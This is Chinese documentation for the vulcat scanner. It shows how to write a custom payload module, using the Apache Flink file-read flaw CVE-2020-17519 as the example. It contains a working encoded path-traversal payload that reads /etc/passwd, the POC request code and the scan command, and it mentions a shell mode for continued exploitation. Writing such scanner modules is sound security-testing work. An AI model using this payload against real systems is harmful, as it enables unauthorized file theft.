# 自定义攻击载荷-示例

##### 本节以Apache Flink的任意文件读取漏洞CVE-2020-17519为例

## 1. 准备模板文件

此处新建一个目录payloads2，并将载荷模板<code>demo.py</code>复制一份，放入该目录
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/02.png" alt=""><figcaption></figcaption></figure>


打开模板文件，其结构如下
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/03.png" alt=""><figcaption></figcaption></figure>


你可以在上方添加注释，例如：
* 漏洞名称
* 漏洞编号
* Payload来源
* 漏洞描述
* POC / EXP作者（编写载荷的人）
* 作者个人主页链接
* ...等
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/04.png" alt=""><figcaption></figcaption></figure>

## 2. 定义Payload

在__init__方法中，定义该漏洞的有效载荷

此处为简便，只定义了一条载荷。
* 在实际运用中，需要对路径、系统等因素设置不同的载荷
* 例如Linux读取/etc/passwd文件
* Windows读取C:/Windows/win.ini文件等

```python
self.payloads = [
    {'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'},
]
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/05.png" alt=""><figcaption></figcaption></figure>



## 3. 编写POC主体

### 3.1 POC基本结构

```python
client = clients.get('reqClient')
        
vul_info = {
    'app_name': 'ApacheFlink',
    'vul_type': 'FileRead',
    'vul_id': 'CVE-2020-17519',
}
```

1. 获取请求客户端<code>client</code>
2. 定义漏洞信息<code>vul_info</code>，其中的三个字段名称是固定的：app_name、vul_type、vul_id

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/06.png" alt=""><figcaption></figcaption></figure>


关于请求客户端<code>client</code>，vulcat包装了<code>requests</code>以及<code>HackRequests</code>这两个库
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/07.png" alt=""><figcaption></figcaption></figure>

包装过后，可以对HTTP请求进行统一处理

并为其添加一些常用参数，使其更易使用，不用频繁添加参数，例如：
* requests默认将无视HTTPS证书警告（verify=False）
* 默认超时时间10秒
* 统一的HTTP代理
* 域名
* 协议://域名
* ...等
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/08.png" alt=""><figcaption></figcaption></figure>


```python
for payload in self.payloads:
    path = payload['path']
```

让我们回到POC的编写当中

此时你可以遍历<code>self.payloads</code>，并接收其中的参数
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/09.png" alt=""><figcaption></figcaption></figure>

### 3.2 请求调用

```python
res = client.request(
    'get',
    path,
    vul_info=vul_info
)
if res is None:
    continue
```

使用客户端<code>client</code>发出请求
* 第一个参数：HTTP方法（大小写不敏感）
* 第二个参数：URL路径<b>（注意，只需要路径，不需要前面的http://xxx.com/，因为vulcat会自动将它们拼接起来）</b>
* 额外的参数：vul_info漏洞信息，将作用于HTTP日志（也就是--log选项输出的HTTP信息）

接收请求之后，你需要判断结果是否为<code>None</code>
* 如果为None，说明请求失败，跳过当前载荷，继续下一轮循环
* 如果不为None，说明请求成功，接下来将判断是否存在漏洞

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/10.png" alt=""><figcaption></figcaption></figure>

### 3.3 判断结果 并 返回漏洞信息

```python
from lib.tool import check

if (check.check_res_fileread(res.text)):
    results = {
        'Target': res.request.url,
        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
        'Request': res
    }
    return results
```

对于文件读取漏洞，你可以使用vulcat自带的方法<code>check.check_res_fileread()</code>来进行检测
* 如果目标存在文件读取漏洞，则该方法返回 True
* 否则返回 False

如果存在漏洞，则返回结果results
* 字符串数据，将以 <b>key:value</b> 的方式显示（例如Target）
* 列表数据，将以 <b>key: v1 v2 v3</b> 的方式显示（例如Type）
* Response数据，将显示一个<b>HTTP请求数据包</b>（例如Request）

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/13.png" alt=""><figcaption></figcaption></figure>


注意：使用该方法之前需要先导入模块
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/12.png" alt=""><figcaption></figcaption></figure>


这是vulcat自带的<code>check.check_res_fileread()</code>函数，你可以定义统一的检测需求
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/15.png" alt=""><figcaption></figcaption></figure>



### 3.4 Start()

最后，在Start方法中进行调配，此处直接返回一个<code>self.POC(clients)</code>，其中传递了一个参数clients
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/14.png" alt=""><figcaption></figcaption></figure>


## 4. 装填载荷

### 4.1 修改载荷文件名称

命名规则：<b>框架名称-编号-漏洞类型</b>
* 如果框架名称太长，可以使用 - 分隔
* 可以同时存在多个漏洞类型，例如 apache-httpd-cve-2021-42013-rce-fileread

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/16.png" alt=""><figcaption></figcaption></figure>


### 4.2 把载荷 放入载荷路径

把大象装进冰箱需要几步？
把大象装进冰箱需要几步？
把大象装进冰箱需要几步？

1. 打开<code>vulcat/config.yaml</code>查看载荷路径
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/17.png" alt=""><figcaption></figcaption></figure>

2. 把刚刚编写的文件丢进<code>payloads/</code>目录
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/18.png" alt=""><figcaption></figcaption></figure>

3. 关闭<code>vulcat/config.yaml</code>文件

（此步骤没有图片）


## 5. 扫描测试

现在，vulcat会自动识别你编写的载荷，你可以运行vulcat测试效果

```bash
python vulcat.py -u <目标地址> --log 3 -v <载荷名称>
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/19.png" alt=""><figcaption></figcaption></figure>


<code>-v/--vuln</code>选项支持模糊匹配，你不需要输入完整的载荷名称
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/20.png" alt=""><figcaption></figcaption></figure>

模糊匹配
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/21.png" alt=""><figcaption></figcaption></figure>


<code>--shell</code>支持，可以使用该选项进入Shell交互模式，以持续利用漏洞：

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/22.png" alt=""><figcaption></figcaption></figure>


## 6. 废话

你可以为载荷创建一个专门的目录，用于分类

（不会影响载荷的效果，就算有几百层目录，vulcat也可以识别 并装填Payload）

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/23.png" alt=""><figcaption></figcaption></figure>

